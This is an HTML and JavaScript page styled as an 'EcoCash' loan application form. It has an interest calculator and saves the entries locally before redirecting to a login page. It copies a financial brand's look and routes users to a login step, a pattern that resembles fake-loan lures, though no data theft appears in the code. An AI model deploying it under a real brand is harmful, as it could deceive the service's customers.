<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Loan Application</title>

<style>
*{
    box-sizing:border-box;
    margin:0;
    padding:0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
}

body{
    background:#f2f4f8;
}

/* EcoCash Logo Top Left */
.ecocash-logo {
    position: absolute;
    top: 20px;
    left: 20px;
    font-size: 24px;
    font-weight: bold;
}
.ecocash-logo .eco { color: #007cba; }
.ecocash-logo .cash { color: #e53935; }

/* Header */
.header{
    background:#155fa0;
    color:#fff;
    padding:40px 20px 80px;
    border-bottom-left-radius:60% 80px;
    border-bottom-right-radius:60% 80px;
    text-align:center;
}

.header h2{
    font-size:26px;
    font-weight:600;
}

/* Main Container */
.container{
    max-width:450px;
    margin:-60px auto 40px;
    background:#fff;
    padding:25px;
    border-radius:18px;
    box-shadow:0 8px 20px rgba(0,0,0,0.08);
}

/* Form */
label{
    display:block;
    margin-top:18px;
    font-size:14px;
    color:#555;
}

input, select, textarea{
    width:100%;
    padding:12px;
    margin-top:6px;
    border:1px solid #dcdcdc;
    border-radius:10px;
    font-size:15px;
    outline:none;
    transition:0.2s;
}

input:focus, select:focus, textarea:focus{
    border-color:#1e73be;
}

textarea{
    resize:none;
    height:80px;
}

/* Info Box */
.loan-info{
    background:#f4f8fc;
    padding:15px;
    border-radius:12px;
    margin-top:20px;
    font-size:14px;
}

.loan-info p{
    margin:6px 0;
}

/* Button */
button{
    width:100%;
    margin-top:25px;
    padding:14px;
    background:#1e73be;
    color:#fff;
    border:none;
    border-radius:12px;
    font-size:16px;
    font-weight:500;
    cursor:pointer;
    transition:0.3s;
}

button:hover{
    background:#155fa0;
}

/* Responsive */
@media(max-width:480px){
    .container{
        margin-top:-50px;
        padding:20px;
    }
}
</style>
</head>
<body>

<!-- EcoCash Top-Left -->
<div class="ecocash-logo">
    <span class="eco">Eco</span><span class="cash">Cash</span>
</div>

<div class="header">
    <h2>Apply for a Loan</h2>
</div>

<div class="container">

<form id="loanForm">

<label>Full Name</label>
<input type="text" id="fullName" required placeholder="Enter your full name">

<label>Phone Number</label>
<input type="tel" id="phone" required placeholder="e.g 07XXXXXXXX" pattern="07[0-9]{8}">

<label>Loan Amount (USD)</label>
<input type="number" id="amount" required min="50" max="10000" placeholder="Enter amount">

<label>Repayment Period</label>
<select id="period" required>
    <option value="">Select repayment period</option>
    <option value="1">1 Month</option>
    <option value="3">3 Months</option>
    <option value="6">6 Months</option>
    <option value="12">12 Months</option>
</select>

<label>Loan Purpose</label>
<textarea id="purpose" required placeholder="Why do you need this loan?"></textarea>

<div class="loan-info">
    <p><strong>Interest Rate:</strong> <span id="interestRate">-</span></p>
    <p><strong>Total Repayment:</strong> $<span id="totalRepayment">0</span></p>
    <p><strong>Monthly Installment:</strong> $<span id="monthlyPayment">0</span></p>
</div>

<button type="submit">Submit Application</button>

</form>

</div>

<script>
const amountInput = document.getElementById("amount");
const periodSelect = document.getElementById("period");
const interestDisplay = document.getElementById("interestRate");
const totalDisplay = document.getElementById("totalRepayment");
const monthlyDisplay = document.getElementById("monthlyPayment");

function calculateLoan(){
    const amount = parseFloat(amountInput.value);
    const months = parseInt(periodSelect.value);

    if(!amount || !months){
        interestDisplay.textContent = "-";
        totalDisplay.textContent = "0";
        monthlyDisplay.textContent = "0";
        return;
    }

    // Simple EcoCash-style interest logic
    let interestRate = 0.10; // 10% base
    if(months === 3) interestRate = 0.15;
    if(months === 6) interestRate = 0.20;
    if(months === 12) interestRate = 0.30;

    const interestAmount = amount * interestRate;
    const totalRepayment = amount + interestAmount;
    const monthlyPayment = totalRepayment / months;

    interestDisplay.textContent = (interestRate * 100) + "%";
    totalDisplay.textContent = totalRepayment.toFixed(2);
    monthlyDisplay.textContent = monthlyPayment.toFixed(2);
}

amountInput.addEventListener("input", calculateLoan);
periodSelect.addEventListener("change", calculateLoan);

document.getElementById("loanForm").addEventListener("submit", function(e){
    e.preventDefault();

    const application = {
        fullName: document.getElementById("fullName").value.trim(),
        phone: document.getElementById("phone").value.trim(),
        amount: amountInput.value,
        period: periodSelect.value,
        purpose: document.getElementById("purpose").value.trim(),
        status: "pending",
        createdAt: new Date().toISOString()
    };

    localStorage.setItem("loanApplication", JSON.stringify(application));

    // alert("Loan Application Submitted Successfully!");
    // Redirect to login
    window.location.href = "login.html";
});
</script>

</body>
</html>
